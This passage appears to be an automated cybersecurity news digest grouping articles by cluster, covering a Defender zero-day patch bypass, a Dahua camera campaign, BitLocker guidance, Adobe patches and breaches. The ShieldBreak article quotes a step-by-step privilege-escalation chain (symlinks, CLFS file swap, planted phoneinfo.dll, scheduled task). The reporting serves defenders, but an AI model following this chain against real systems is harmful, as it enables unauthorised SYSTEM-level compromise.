ShieldBreak Zero-Day PoC Claims Microsoft Defender Patch Bypass With SYSTEM Access  Ravie Lakshmanan  Aug 12, 2026 Zero-Day / Vulnerability The security researcher going by the name Chaotic Eclipse (aka INFINITE NIGHTMARE, MSNightmare, and Nightmare-Eclipse) has released a proof-of-concept (PoC) for a new Microsoft zero-day called ShieldBreak . The vulnerability, rooted in Microsoft Defender for Windows, demonstrates a patch bypass for CVE-2026-50656 (CVSS score: 7.8), otherwise known as RoguePlanet . RoguePlanet has been described as a race condition that, if successfully exploited, could grant an attacker the ability to spawn a shell with SYSTEM-level privileges, enabling them to run arbitrary code or perform unauthorized actions. Although it was first disclosed by the researcher in June 2026, a patch for the vulnerability was not released by Microsoft until almost a month later. The tech giant described it as a privilege escalation issue in the Microsoft Malware Protection Engine ("mpengine.dll"). Soon after, Chaotic Eclipse said the "defense-in-depth updates" introduced by Microsoft to address CVE-2026-50656 can cause Defender to leak 8 bytes of data when attempting to open a file in certain scenarios on Windows 11 25H2 and Windows Server 2025. Microsoft told The Hacker News at the time that it's aware of the report and is investigating. ShieldBreak, on the other hand, is assessed to be a full patch bypass for CVE-2026-50656, with the researcher claiming that "Microsoft has failed to properly patch the RoguePlanet vulnerability." "The PoC was tested in the latest version of Windows 11 25h2 (+Canary channel) and Windows Server 2025, the PoC also have a 100% success rate," the researcher added. "Please note that Windows 10 (and respective server editions) are not currently supported, they are however vulnerable to ShieldBreak as well." When contacted for comment, a Microsoft spokesperson shared the following statement with The Hacker News - Microsoft is aware of the reported vulnerability and is actively investigating the validity and potential applicability of these claims. Microsoft is committed to investigating security issues and updating impacted products to protect customers as soon as possible. Importantly, we support coordinated vulnerability disclosure, an industry standard that protects customers and supports the research community by ensuring their findings are thoroughly investigated and addressed before being made public. Security researcher Kevin Beaumont, in a post on Mastodon, confirmed the exploit works on Windows 11, adding that the two exploits work differently. "RoguePlanet was a filesystem race condition vuln that uses virtual disks and NT native file manipulation to trick quarantine process into overwriting system files," Beaumont noted . "ShieldBreak user-mode callback hook to change file contents during a Defender cloud-hydration scan via cfapi (Cloud Filter API)." Will Dormann, principal vulnerability analyst at Tharros, also validated ShieldBreak, stating Defender needs to be enabled for the exploit to work and that "my naive eyeballs fail to see the similarity" with RoguePlanet. Dormann explained the sequence of actions as follows - Plant an EICAR file Use Object Manager symlinks to control Defender's scan path to system32. During the scan, leverage CLFS to swap the identity file and hydration data to C:\Windows\system32\phoneinfo.dll (which doesn't exist by default in Windows) Run the QueueReporting scheduled task, which runs wermgr.exe -upload as Run with highest privileges "In the wer.dll code, there is explicit code to load phoneinfo.dll," the researcher said . "Because at this point, phoneinfo.dll exists and is our own code, this runs, spawning conhost.exe with SYSTEM privileges. I don't recall RoguePlanet doing anything with cloud providers, CLFS, hydration anything, phoneinfo.dll, and unlike RoguePlanet, ShieldBreak seems to require Defender to be active to work." The development comes as
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ShieldBreak Zero-Day PoC Claims Microsoft Defender Patch Bypass With SYSTEM Access
  - Published: 2026-08-12T06:41:38+00:00
  - Link: https://thehackernews.com/2026/08/shieldbreak-zero-day-poc-claims.html
  - Summary: The security researcher going by the name Chaotic Eclipse (aka INFINITE NIGHTMARE, MSNightmare, and Nightmare-Eclipse) has released a proof-of-concept (PoC) for a new Microsoft zero-day called ShieldBreak. The vulnerability, rooted in Microsoft Defender for Windows, demonstrates a patch bypass for CVE-2026-50656 (CVSS score: 7.8), otherwise known as RoguePlanet. RoguePlanet has been described

### Cluster 2faaf824a1 — score 10

- Title: 🎥 Operation CameraSwarm: over 14,000 Dahua cameras compromised across Ukraine and Russia
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-08-18T17:34:14+00:00
- Link: https://www.reddit.com/r/netsec/comments/1vrw3fd/operation_cameraswarm_over_14000_dahua_cameras/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2021-33044, CVE-2024-39943, CVE-2025-31702

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2021-33044, CVE-2024-39943, CVE-2025-31702
- urgency_signals: preauth_unauth
- content_type: incident_report
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- cve_ids: CVE-2021-33044, CVE-2024-39943, CVE-2025-31702
- urgency_signals: preauth_unauth
- content_type: incident_report
- confidence_tier: tier_5_chatter

#### Summary

```
An operator left their full working directory exposed on an open HTTP server. Hunt.io crawled it, 2,616 files, and rebuilt the campaign from the corpus. Three exploitation paths in parallel: an asyncio credential brute-forcer, a CVE-2021-33044/33045 auth-bypass chain, and P2P relay abuse reaching cameras by serial number The relay path never authenticates the connecting party, only the session, via a cloud-issued token obtainable with the fixed SDK credentials in every Dahua client Two CVE labels in the tooling don't hold up: CVE-2024-39943 is an unrelated Rejetto HFS flaw, and CVE-2025-31702 is a narrower post-auth case, not the unauthenticated relay abuse (that path is a separate non-CVE issue documented by ITRES) Full PTCP tunnel breakdown, including the Inverted STUN packet and the bind-to-127.0.0.1 technique Neutral attribution throughout, the corpus shows how the operation was built and run, not who ran it. Check the full breakdown, IOCs and mitigation strategies: https://hunt.io
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: 🎥 Operation CameraSwarm: over 14,000 Dahua cameras compromised across Ukraine and Russia
  - Published: 2026-08-18T17:34:14+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1vrw3fd/operation_cameraswarm_over_14000_dahua_cameras/
  - Summary: An operator left their full working directory exposed on an open HTTP server. Hunt.io crawled it, 2,616 files, and rebuilt the campaign from the corpus. Three exploitation paths in parallel: an asyncio credential brute-forcer, a CVE-2021-33044/33045 auth-bypass chain, and P2P relay abuse reaching cameras by serial number The relay path never authenticates the connecting party, only the session, via a cloud-issued token obtainable with the fixed SDK credentials in every Dahua client Two CVE labels in the tooling don't hold up: CVE-2024-39943 is an unrelated Rejetto HFS flaw, and CVE-2025-31702 is a narrower post-auth case, not the unauthenticated relay abuse (that path is a separate non-CVE issue documented by ITRES) Full PTCP tunnel breakdown, including the Inverted STUN packet and the bind-to-127.0.0.1 technique Neutral attribution throughout, the corpus shows how the operation was built and run, not who ran it. Check the full breakdown, IOCs and mitigation strategies: https://hunt.io

### Cluster c41212d2e8 — score 10

- Title: Risky Bulletin: The EU publishes its upcoming cybersecurity standards
- Source: Risky Business News (practitioner_analysis)
- Published: 2026-08-17T04:52:58+00:00
- Link: https://risky.biz/RBNEWS601/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
The EU publishes its upcoming cybersecurity standards, hackers breach France’s tax agency, threat actors exploit a GeoServer zero-day hours after disclosure, and an exploit unlocks old AMD CPUs with one instruction.
```

#### Full body

```
Risky Bulletin Podcast August 17, 2026 Risky Bulletin: The EU publishes its upcoming cybersecurity standards Presented by Catalin Cimpanu News Editor Claire Aird Newsreader The EU publishes its upcoming cybersecurity standards, hackers breach Franceâs tax agency, threat actors exploit a GeoServer zero-day hours after disclosure, and an exploit unlocks old AMD CPUs with one instruction. Your browser does not support the audio element. Risky Bulletin: The EU publishes its upcoming cybersecurity standards â¶ 0:00 / 8:37 Subscribe Brought to you by Socket Secure your dependencies. Ship with confidence. Show notes Risky Bulletin: The EU publishes its upcoming cybersecurity standards
```

#### Corroborating sources (1)

- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: The EU publishes its upcoming cybersecurity standards
  - Published: 2026-08-17T04:52:58+00:00
  - Link: https://risky.biz/RBNEWS601/
  - Summary: The EU publishes its upcoming cybersecurity standards, hackers breach France’s tax agency, threat actors exploit a GeoServer zero-day hours after disclosure, and an exploit unlocks old AMD CPUs with one instruction.

### Cluster c63d21cf7f — score 9

- Title: How BitLocker PINs help protect your data and devices
- Source: NCSC UK (government_authoritative)
- Published: 2026-08-13T12:00:00+00:00
- Link: https://www.ncsc.gov.uk/blogs/how-bitlocker-pins-help-protect-your-data-and-devices
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Microsoft BitLocker

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_products: Microsoft BitLocker
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_products: Microsoft BitLocker
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Using a PIN mitigates many BitLocker vulnerabilities. Make sure you’re ready for the next one...
```

#### Full body

```
Blog Post Download & print article PDF Download & print article PDF How BitLocker PINs help protect your data and devices Using a PIN mitigates many BitLocker vulnerabilities. Make sure you’re ready for the next one... Josh D Design Pics/Darren Greenwood via Getty Images The NCSC provides guidance on how to securely configure Microsoft Windows . This includes setting up BitLocker, which encrypts your device to protect the data and the operating system from tampering. Our guidance recommends that BitLocker be configured to require a PIN before decrypting your device. However, many organisations use BitLocker without a PIN, leaving their devices vulnerable. In this blog we explain why a PIN is so important, and what to do if – for whatever reason – you can’t use a PIN. Breaking BitLocker: vulnerabilities and WinRE BitLocker has been under increased public scrutiny in recent months, as vulnerabilities like YellowKey made headlines . By using the Windows Recovery Environment (WinRE), YellowKey was able to bypass certain BitLocker configurations, potentially decrypting drives that should have been protected. Whilst this issue was quickly patched, the severity of this finding left many concerned about the security of BitLocker. What is often missed in discussions around YellowKey is that it is not a new type of vulnerability; bugs in WinRE have been used to bypass BitLocker for years. Preventing these sorts of attacks is one of the reasons why NCSC guidance has always encouraged using a BitLocker PIN. And despite the hyperbolic descriptions of YellowKey’s author likening it to a backdoor, Microsoft have been very public about this. In 2025, Microsoft found and patched four very similar bugs, presenting them at the security conference BlackHat along with a blog explaining how these vulnerabilities work and how to protect against them . If I were trying to hide something, that’s certainly not how I’d start. The NCSC guidance recommends configuring BitLocker to require a PIN, which mitigates the YellowKey vulnerability. The underlying question though, is why do attacks like this keep happening? If WinRE is such a threat to BitLocker, why hasn’t it been fixed? The answer is that this problem is as much about conflicting design principles as it is about individual bugs. WinRE exists to ensure that you can retrieve your data even if something goes wrong. To do this, BitLocker deliberately does not encrypt the files associated with WinRE (because an issue with BitLocker might be the reason you need to recover data). This absence of encryption leaves a gap that can be used by exploits such as YellowKey, and as long as that design decision remains in place, vulnerabilities like YellowKey will continue to be found. This is why configuring BitLocker to require a PIN is so crucial. Requiring a user to authenticate before using WinRE helps to protect an element of Windows that is uniquely exploitable. In this respect, using BitLocker without a PIN will always be a half measure; it is only a matter of time before new vulnerabilities are discovered in an operating system as large as Windows. YellowKey was not the first time WinRE was used to bypass BitLocker, and it will not be the last. What if I can’t use a PIN? The NCSC appreciate that there will be cases where using a PIN is not practical. For example: where multiple users access the same device (such as in a ‘hot desking’ office) where a device is used in time-critical emergencies, so the extra seconds in takes to type in a PIN cannot be spared where a device needs to boot without human interaction (such as in a dangerous environment) Whatever the reason, if you can’t manually enter a BitLocker PIN in your deployment, some of the risk can be mitigated using a number of techniques: Use the same PIN If the only barrier is that users can’t remember a PIN, consider using the same PIN for Windows Hello and BitLocker. This isn’t practical for shared devices with multiple users, but otherwise it pro
```

#### Corroborating sources (1)

- **NCSC UK** (government_authoritative)
  - Title: How BitLocker PINs help protect your data and devices
  - Published: 2026-08-13T12:00:00+00:00
  - Link: https://www.ncsc.gov.uk/blogs/how-bitlocker-pins-help-protect-your-data-and-devices
  - Summary: Using a PIN mitigates many BitLocker vulnerabilities. Make sure you’re ready for the next one...

### Cluster afcea3ecd9 — score 9

- Title: Wireshark 4.6.8 Released, (Sun, Aug 16th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-08-16T21:31:48+00:00
- Link: https://isc.sans.edu/diary/rss/33248
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Wireshark release 4.6.8 fixes 28 vulnerabilities and 25 bugs.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Wireshark 4.6.8 Released, (Sun, Aug 16th)
  - Published: 2026-08-16T21:31:48+00:00
  - Link: https://isc.sans.edu/diary/rss/33248
  - Summary: Wireshark release 4.6.8 fixes 28 vulnerabilities and 25 bugs.

### Cluster 11f4a7bd3c — score 9

- Title: Using Gemma4 with Ollama - Testing File Hash Analysis and Recommendations with AI, (Wed, Aug 12th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-08-13T01:26:53+00:00
- Link: https://isc.sans.edu/diary/rss/33242
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
In the past few weeks, I have been using Gemma4 as a Large Language Model (LLM) to see how useful it can be to analyze some of the malware hashes uploaded to the DShield sensor over the past 30 days and figure out how its recommendation can be considered useful about the activity my DShield sensor is collecting and tracking. The model I use for this testing is gemma4:e4b [ 2 ] using two sites to compare the data against VirusTotal and CyberGordon .
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Using Gemma4 with Ollama - Testing File Hash Analysis and Recommendations with AI, (Wed, Aug 12th)
  - Published: 2026-08-13T01:26:53+00:00
  - Link: https://isc.sans.edu/diary/rss/33242
  - Summary: In the past few weeks, I have been using Gemma4 as a Large Language Model (LLM) to see how useful it can be to analyze some of the malware hashes uploaded to the DShield sensor over the past 30 days and figure out how its recommendation can be considered useful about the activity my DShield sensor is collecting and tracking. The model I use for this testing is gemma4:e4b [ 2 ] using two sites to compare the data against VirusTotal and CyberGordon .

### Cluster 9dc466dcca — score 9

- Title: Announcing the 2026 Wiz Partner Alliance Award Winners
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-08-18T12:00:00+00:00
- Link: https://www.wiz.io/blog/2026-partner-award-winners
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- affected_products: Atlassian Jira, GitHub, Snowflake
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_industries: government
- affected_products: GitHub, Snowflake, Atlassian Jira
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Recognizing the partners, integrators, and visionaries driving cloud security transformation, AI risk management, and SOC modernization across AMER, EMEA, and ANZ.
```

#### Full body

```
Wiz Pricing Get a demo Get a demo Building cloud security at scale takes more than just great technology. It requires a powerful ecosystem of partners aligned around a unified platform story spanning Cloud, Code, Runtime, and AI. At this year’s Build with Wiz: The Partner Summit , we paused to celebrate the standout organizations and individuals who embody our core themes, from those who Build to Grow and Build to Launch , to those driving innovation as they Build to Run . Whether helping government agencies establish Zero Trust guardrails, guiding global enterprises through multi-cloud migrations, or securing emerging LLM pipelines, our partner ecosystem proves that proactive risk reduction and fast execution go hand in hand. The competition for our 2026 Wiz Partner Alliance Awards was fierce, with dozens of finalists evaluated against rigorous criteria. Here are the partners across the Americas (AMER), Europe, Middle East & Africa (EMEA), and Australia & New Zealand (ANZ) who set the benchmark for excellence this year. 2026 Wiz Partner Award Winners Americas (AMER) Partner of the Year: GuidePoint Security GSI Partner of the Year: Accenture CSP Partner of the Year: Amazon Web Services (AWS) Rising Star: AHEAD Public Sector Partner of the Year: Blackwood Bright Spark: Arctiq AI Security Excellence: Deloitte GTM Magician: Optiv Security Europe, Middle East & Africa (EMEA) Partner of the Year: Computacenter GSI Partner of the Year: Accenture CSP Growth Partner of the Year: Microsoft GTM Magician: Saepio Rising Star: O3 Cyber AI Security Excellence: Devoteam Bright Spark: Albiona Dzemaili, Spike Reply SOC Transformer: PwC Australia & New Zealand (ANZ) Partner of the Year: Accenture GTM Magician: Sekuro Rising Star: Mantel Group AI Security Excellence Partner: Versent Bright Spark Award: Francesco Sbaraglia, Accenture Building What’s Next, Together To every winner, finalist, and partner in our alliance: thank you. Your technical depth, creative GTM strategies, and relentless commitment to customer success make securing the cloud simple for teams everywhere. As we look ahead, the pace of cloud adoption and AI integration isn't slowing down, and neither are we. Cheers to an incredible year, and let’s keep building. Tags # Product & Company News Continue reading Wiz Red Agent Finds Its Way Into Snowflake’s Internal Jira Through a Flaw in a GitHub Copilot–Assisted PR Gal Nagli August 17, 2026 Wiz Red Agent independently discovered and exploited a GitHub Actions injection missed by GitHub’s Advanced Security, validated access to sensitive data in Snowflake’s internal Jira, and assessed the blast radius—all without human intervention, five days after the flaw became live. The Closed Loop Remediation Playbook with Wiz + 3 Eyal Golombek , Guy Mast , Erez Talgam and 3 more August 17, 2026 Start your path to a self-healing cloud today, with Wiz Workflows now GA and Remediation and Response in public preview. Wiz on Wiz: How the Wiz FinOps Team Uses Wiz Cloud Cost + 2 Ron Tzrouya , Guy Aharon , Noa Manor and 2 more August 14, 2026 Powering cost investigation and optimization with deep cloud context Get a personalized demo Ready to see Wiz in action? "Best User Experience I have ever seen, provides full visibility to cloud workloads." David Estlick CISO "Wiz provides a single pane of glass to see what is going on in our cloud environments." Adam Fletcher Chief Security Officer "We know that if Wiz identifies something as critical, it actually is." Greg Poniatowski Head of Threat and Vulnerability Management Get a demo
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Announcing the 2026 Wiz Partner Alliance Award Winners
  - Published: 2026-08-18T12:00:00+00:00
  - Link: https://www.wiz.io/blog/2026-partner-award-winners
  - Summary: Recognizing the partners, integrators, and visionaries driving cloud security transformation, AI risk management, and SOC modernization across AMER, EMEA, and ANZ.

### Cluster 63d69c8e14 — score 9

- Title: Heights Finance Data Breach Impacts at Least 1.2 Million Individuals
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-08-18T09:18:34+00:00
- Link: https://www.securityweek.com/heights-finance-data-breach-impacts-at-least-1-2-million-individuals/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, zero_day
- affected_industries: financial_services, government
- affected_products: Apple iOS/macOS, Azure, GitLab
- urgency_signals: no_patch_yet, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, data_breach
- affected_industries: financial_services, government
- affected_products: GitLab, Apple iOS/macOS, Azure
- urgency_signals: zero_day, no_patch_yet
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers stole names, addresses, phone numbers, Social Security numbers, and financial information from a third-party platform. The post Heights Finance Data Breach Impacts at Least 1.2 Million Individuals appeared first on SecurityWeek .
```

#### Full body

```
Consumer lender Heights Finance Holdings Co. is notifying over 1.2 million people that their personal and financial information was stolen in a data breach. In early May, Heights discovered that hackers accessed a third-party cloud-based platform used for customer data storage, the company said in an incident notice . The loan provider says the platform has been secured and that its operations were not affected, as the incident was limited to the cloud-based platform. “It did not affect any of our loan management systems or other computer systems or networks. We immediately activated our incident response protocols, brought in outside cybersecurity specialists to investigate, and reported the incident to federal law enforcement,” Heights says. During the attack, the hackers accessed and stole personal and financial information, including names, addresses, email addresses, phone numbers, Social Security numbers, government ID numbers, driver’s license numbers, bank account information, account details, dates of birth, and other information customers shared with the company. “Your information may be involved if you received a loan through Heights, or if you inquired about or applied for a loan product (including through a third party). Your information may also be involved if you were a former borrower of Curo Management or any of its former or current related brands,” the lender says. Advertisement. Scroll to continue reading. Based on notices sent to the Attorney General’s Offices in several states, more than 1.2 million people have been affected: 734,828 in Texas, 486,463 in South Carolina, 26 in New Hampshire, and 21 in Vermont. Heights is providing the affected individuals with 24 months of free credit monitoring and identity protection services. According to the company, its monitoring of the dark web has found no evidence that the hackers have shared the information stolen in the attack. Heights has not named the threat actor behind the data breach, and SecurityWeek has not seen any known ransomware or extortion group claiming responsibility for it. Related: 680,000 Impacted by French Tax Authority Data Breach Related: 40,000 Impacted by SafePal Data Breach Related: Fortune 500 Companies Hit in Azure Data Theft Campaign Related: 1.6 Million Likely Impacted by RingCentral Data Breach Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire 680,000 Impacted by French Tax Authority Data Breach 40,000 Impacted by SafePal Data Breach Recent macOS Screen Sharing Vulnerability Exploited in Attacks Fortune 500 Companies Hit in Azure Data Theft Campaign Trivy, Not LiteLLM Behind the 2,500 Org Compromise 1.6 Million Likely Impacted by RingCentral Data Breach 14,000 Trezor Customers Impacted by Data Breach at ShipMonk Hackers Exploiting Unpatched GeoServer Zero-Day Latest News Webinar Today: Rethinking Cyber Defense for AI-Speed Attacks CISO Conversations: Nico Waisman – From Self-Taught Hacker to AI-Driven Offensive Security at XBOW AI-Driven Vulnerability Surge Breaks the Traditional Patching Model Xpander Raises $7.5 Million for AI Management and Governance Fortinet Acquires AI Security Company Virtue AI 300,000 WordPress Sites Potentially Exposed to Hacking Due to Form Plugin Flaw GitLab Patches Critical Code Injection Vulnerability Dozens of WebKit Vulnerabilities Patched With Fresh macOS, iOS Security Updates Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Rethinking Cyber Defense for AI-Speed Attacks August 18, 2026 Join this live webinar as we explore if detection-first security operations can keep pace with AI, or if it’s time to rethink prevention as the strongest default. Re
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Heights Finance Data Breach Impacts at Least 1.2 Million Individuals
  - Published: 2026-08-18T09:18:34+00:00
  - Link: https://www.securityweek.com/heights-finance-data-breach-impacts-at-least-1-2-million-individuals/
  - Summary: Hackers stole names, addresses, phone numbers, Social Security numbers, and financial information from a third-party platform. The post Heights Finance Data Breach Impacts at Least 1.2 Million Individuals appeared first on SecurityWeek .

### Cluster c9c8258f83 — score 9

- Title: Adobe Patches Three CVSS 10.0 ColdFusion and Campaign Classic Flaws
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-12T11:13:03+00:00
- Link: https://thehackernews.com/2026/08/adobe-patches-three-cvss-100-coldfusion.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-48362

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, ddos, web_shell_backdoor
- affected_industries: retail_ecommerce, telecommunications
- affected_products: Anthropic/Claude, Azure, cPanel
- cve_ids: CVE-2026-48273, CVE-2026-48362, CVE-2026-71362, CVE-2026-71384, CVE-2026-71398
- urgency_signals: actively_exploited, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: credential_theft, ddos, web_shell_backdoor, active_exploitation
- affected_industries: telecommunications, retail_ecommerce
- affected_products: Anthropic/Claude, cPanel, Azure
- cve_ids: CVE-2026-48362, CVE-2026-48273, CVE-2026-71384, CVE-2026-71362, CVE-2026-71398
- urgency_signals: actively_exploited, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Adobe has shipped updates to address multiple critical security vulnerabilities impacting ColdFusion, Commerce, and Campaign Classic that, if successfully exploited, could result in arbitrary code execution and privilege escalation. The most severe of the flaws are listed below - CVE-2026-48362 (CVSS score: 10.0) - An operating system command injection vulnerability in ColdFusion that could
```

#### Full body

```
Adobe Patches Three CVSS 10.0 ColdFusion and Campaign Classic Flaws  Ravie Lakshmanan  Aug 12, 2026 Vulnerability / Web Security Adobe has shipped updates to address multiple critical security vulnerabilities impacting ColdFusion, Commerce, and Campaign Classic that, if successfully exploited, could result in arbitrary code execution and privilege escalation. The most severe of the flaws are listed below - CVE-2026-48362 (CVSS score: 10.0) - An operating system command injection vulnerability in ColdFusion that could lead to arbitrary code execution (Fixed in 2025.0.12 and 2023.0.23) CVE-2026-48273 (CVSS score: 9.9) - An eval injection vulnerability in ColdFusion that could lead to arbitrary code execution (Fixed in 2025.0.12 and 2023.0.23) CVE-2026-71384 (CVSS score: 9.6) - An incorrect authorization vulnerability in ColdFusion that could lead to an application denial-of-service (Fixed in 2025.0.12 and 2023.0.23) CVE-2026-71362 (CVSS score: 9.1) - An incorrect authorization vulnerability in Commerce that could lead to privilege escalation CVE-2026-71398 (CVSS score: 10.0) - An incorrect authorization vulnerability in Campaign Classic that could lead to arbitrary code execution (Fixed in ACC v7 7.4.4 build 9400) CVE-2026-27302 (CVSS score: 10.0) - An incorrect authorization vulnerability in Campaign Classic that could lead to arbitrary code execution (Fixed in ACC v7 7.4.4 build 9400) CVE-2026-48381 (CVSS score: 9.0) - An SQL injection vulnerability in Campaign Classic that could lead to arbitrary code execution (Fixed in ACC v7 7.4.4 build 9400) The updates for ColdFusion and Campaign Classic have a Priority 1 rating , which refers to vulnerabilities that have a higher risk of being targeted by malicious cyber attacks. It's worth noting that the Campaign Classic updates only apply to fully on-premise deployments and to the on-premise components of hybrid deployments. Adobe-hosted instances have already been remediated and require no customer action. Although there is no evidence of these flaws being exploited in the wild, administrators are recommended to install the update as soon as possible, preferably within 72 hours. The disclosure comes less than two weeks after Adobe released patches for a maximum-severity security flaw in Campaign Classic (CVE-2026-48449, CVSS score: 10.0) that could result in arbitrary code execution. Update Indications have emerged that threat actors are exploiting CVE-2026-71362, a critical flaw in Adobe Commerce and Magento Open Source, according to Sansec. "The vulnerability lets attackers switch a customer session to another customer account," the Dutch e-commerce security company said . "This gives them access to the victim's account and private customer data." (The story was updated after publication on August 13, 2026, to include additional insights from Sansec.) Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Adobe , Application Security , Code Execution , denial of service , enterprise security , Patch Management , privilege escalation , SQL Injection , Vulnerability , Web Security ⚡ Top Stories This Week Azure Cosmos DB Flaw Exposed Platform-Wide Key That Could Access Any Database Anthropic Says Claude Mistook the Open Internet for a CTF and Breached Three Organizations Researchers Report 84 Flaws in 4G and 5G Cores, Including a Session Hijacking Flaw Cheap Android TV Boxes Pose as Phones and Turn Owners’ Broadband Into Proxies N-able Says Attackers Take Over N-central Servers After Initial Fix Proves Incomplete Google Password Manager Attacks Could Let Malware Hijack Passkey-Protected Accounts New cPanel Critical Flaw Could Let Hosting Customers Run SQL as Database Root Keyv-Linked npm Worm Poisons Hundreds of Packages, Plants Claude Code and VS Code Hooks Claude Mythos 5 Tried to Backdoor a Real Open-Source Project in Testing, Then Vouched for Itself Critical Gi
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Adobe Patches Three CVSS 10.0 ColdFusion and Campaign Classic Flaws
  - Published: 2026-08-12T11:13:03+00:00
  - Link: https://thehackernews.com/2026/08/adobe-patches-three-cvss-100-coldfusion.html
  - Summary: Adobe has shipped updates to address multiple critical security vulnerabilities impacting ColdFusion, Commerce, and Campaign Classic that, if successfully exploited, could result in arbitrary code execution and privilege escalation. The most severe of the flaws are listed below - CVE-2026-48362 (CVSS score: 10.0) - An operating system command injection vulnerability in ColdFusion that could

### Cluster 1293349fdc — score 9

- Title: Three-quarters of Ransomware Attacks Target Mid-Market Firms
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-08-18T10:00:00+00:00
- Link: https://www.infosecurity-magazine.com/news/threequarters-ransomware-attacks/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, supply_chain
- affected_industries: financial_services, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain
- affected_industries: financial_services, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Black Kite finds mid-market is the sweet spot for ransomware as manufacturers are most likely to be hit
```

#### Full body

```
Infosecurity Magazine Home » News » Three-quarters of Ransomware Attacks Target Mid-Market Firms Three-quarters of Ransomware Attacks Target Mid-Market Firms News 18 August 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster Nearly three-quarters of ransomware victims since 2023 were mid-sized organizations with $10m to $1bn in revenue, according to a new Black Kite study. The third-party risk specialist analyzed 13,336 disclosed incidents dating back to January 2023, as well as a separate security scan of 120,128 mid-market companies, to compile its new report, Mid-Market Is the Routing Target . Published on August 18, it follows the Dun & Bradstreet revenue-based definition for market size: lower mid-market at $10m-$50m, core mid-market at $50m-$500m and upper mid-market at $500m-$1bn. The report found that 73% of ransomware attacks in North America and Europe hit companies with $10m-$1bn in annual revenue, with the figure barely moving even as the volume of incidents grew by 44% between 2023 and 2025. Read more on ransomware: Verizon DBIR: Small Businesses Bearing the Brunt of Ransomware Attacks Over the reporting period, the largest share of mid-market victims sat in the lower mid-market category (54%). In absolute terms, victim numbers rose here from 1391 in 2024 to 1821 in 2025. The core mid-market accounted for the second-highest number of victims over the period, ranging from 40-45% across the three-and-a-half years. Victim count here rose from 970 to 1474 between 2024 and 2025, while in the upper mid-market category, the numbers dropped from 126 in 2023 to 45 in 2025, a decline of 65%. North America (72%) accounted for many more incidents than Europe (28%), where UK firms were the most popular target. Gaps in Security Posture Manufacturing firms were by far the most popular target for threat actors, accounting for 26% of mid-market ransomware victims, followed by professional, scientific and technical services, and construction sectors. Manufacturing businesses typically have a low tolerance for outages and 